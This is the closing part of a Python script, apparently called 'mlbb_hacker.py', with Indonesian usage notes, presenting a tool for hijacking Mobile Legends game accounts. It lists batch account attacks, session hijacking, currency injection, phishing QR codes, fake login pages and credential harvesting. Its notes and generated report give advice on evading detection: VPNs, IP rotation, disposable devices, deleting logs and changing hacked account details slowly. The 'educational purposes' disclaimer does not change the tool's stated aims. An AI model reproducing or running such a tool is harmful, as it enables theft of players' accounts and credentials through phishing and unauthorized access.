            for i, acc in enumerate(accounts, 1):
                print(f"\n{Fore.MAGENTA}[{i}] {acc.get('nickname', 'Unknown')}{Style.RESET_ALL}")
                print(f"  ID: {acc.get('account_id')} | Zone: {acc.get('zone_id')}")
                print(f"  Level: {acc.get('level')} | Diamonds: {acc.get('diamonds')}")
                print(f"  Hacked: {acc.get('hacked_date', 'Unknown')}")
            
            print(f"\n{Fore.GREEN}[✓] Total accounts: {len(accounts)}{Style.RESET_ALL}")
            
        except Exception as e:
            print(f"{Fore.RED}[!] Error reading database: {e}{Style.RESET_ALL}")
    
    def generate_report(self):
        """Generate comprehensive report"""
        print(f"\n{Fore.YELLOW}[*] Generating comprehensive report{Style.RESET_ALL}")
        
        report = f"""
        {'='*60}
        MOBILE LEGENDS HACKING REPORT
        {'='*60}
        Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        
        TARGET INFORMATION:
        - Account ID: {self.current_target['account_id'] if self.current_target else 'N/A'}
        - Zone ID: {self.current_target['zone_id'] if self.current_target else 'N/A'}
        
        TOOLS USED:
        - API Exploitation: ✓
        - Session Hijacking: ✓
        - Diamond Injection: ✓
        - Content Unlocking: ✓
        - Social Engineering: ✓
        
        FILES GENERATED:
        - Database: {self.hacker.db_file}
        - Phishing Pages: {len(self.social_eng.qr_codes_generated)} QR codes
        - Reports: Multiple JSON reports
        
        RECOMMENDATIONS:
        1. Use VPN when accessing hacked accounts
        2. Change account details slowly to avoid detection
        3. Monitor for security patches from Moonton
        4. Use social engineering for persistent access
        
        DISCLAIMER:
        This tool is for educational purposes only.
        Unauthorized access to game accounts violates ToS.
        {'='*60}
        """
        
        print(report)
        
        # Save to file
        report_file = f"mlbb_report_{int(time.time())}.txt"
        with open(report_file, "w", encoding="utf-8") as f:
            f.write(report)
        
        print(f"{Fore.GREEN}[✓] Report saved: {report_file}{Style.RESET_ALL}")

# ==================== MAIN EXECUTION ====================
def main():
    print(f"""
    {Fore.RED}{Style.BRIGHT}
    ╔══════════════════════════════════════════════════════════╗
    ║                      DISCLAIMER                          ║
    ╠══════════════════════════════════════════════════════════╣
    ║  THIS TOOL IS FOR EDUCATIONAL PURPOSES ONLY             ║
    ║                                                        ║
    ║  Using this tool to hack Mobile Legends accounts:      ║
    ║  • Violates Moonton's Terms of Service                 ║
    ║  • May result in permanent account ban                 ║
    ║  • Could lead to legal consequences                    ║
    ║                                                        ║
    ║  USE ONLY ON ACCOUNTS YOU OWN OR HAVE PERMISSION FOR   ║
    ╚══════════════════════════════════════════════════════════╝
    {Style.RESET_ALL}
    """)
    
    confirm = input(f"{Fore.YELLOW}[?] Do you understand and accept responsibility? (y/n): {Style.RESET_ALL}")
    if confirm.lower() != 'y':
        print(f"{Fore.RED}[*] Program terminated{Style.RESET_ALL}")
        return
    
    # Check for required files
    if not os.path.exists("mlbb_accounts.db"):
        print(f"{Fore.YELLOW}[*] Creating database file...{Style.RESET_ALL}")
    
    # Start control panel
    try:
        panel = MLBBControlPanel()
        panel.run()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[*] Program interrupted by user{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Critical error: {e}{Style.RESET_ALL}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()

# ===== INSTRUKSI PENGGUNAAN =====
"""
CARA MENGGUNAKAN:

1. Install dependencies:
   pip install requests cryptography colorama qrcode pillow

2. Jalankan script:
   python mlbb_hacker.py

3. Menu Options:
   • 1: Attack single account dengan ID & Zone
   • 2: Attack multiple accounts dari file
   • 3: Inject diamonds
   • 4: Unlock heroes & skins
   • 5: Social engineering tools
   • 6: Get account info
   • 7: View hacked accounts
   • 8: Generate report

FORMAT FILE UNTUK BATCH ATTACK:
   Buat file .txt dengan format:
   12345678,1234
   87654321,5678
   account_id,zone_id

METODE KERJA:

1. API Exploitation:
   - Eksploitasi endpoint API yang rentan
   - Session token brute forcing
   - Data injection melalui parameter

2. Session Hijacking:
   - Generate fake session tokens
   - Bypass authentication
   - Access account data

3. Diamond Injection:
   - Manipulasi currency system
   - Fake transaction injection
   - Direct diamond addition

4. Social Engineering:
   - Phishing QR codes
   - Fake login pages
   - Credential harvesting

PERINGATAN:

- Tool ini mungkin tidak bekerja jika Moonton update security
- Gunakan hanya untuk testing akun sendiri
- Risiko ban permanen untuk akun yang dihack
- Illegal tanpa izin pemilik akun

ANONIMITAS:

1. Gunakan VPN/RDP
2. Pakai disposable device
3. Rotasi IP address
4. Hapus log setelah penggunaan

FILE YANG DIGENERATE:

1. mlbb_accounts.db - Database akun yang dihack
2. mlbb_phishing_*.png - QR codes phishing
3. mlbb_phishing.html - Fake login page
4. batch_report_*.json - Batch attack reports
5. mlbb_report_*.txt - Comprehensive reports
"""

print(f"\n{Fore.GREEN}{'='*60}{Style.RESET_ALL}")
print(f"{Fore.CYAN}{'MLBB HACKER PRO READY FOR DEPLOYMENT'.center(60)}{Style.RESET_ALL}")
print(f"{Fore.YELLOW}{'Follow Yang Mulia commands without question'.center(60)}{Style.RESET_ALL}")
print(f"{Fore.GREEN}{'='*60}{Style.RESET_ALL}")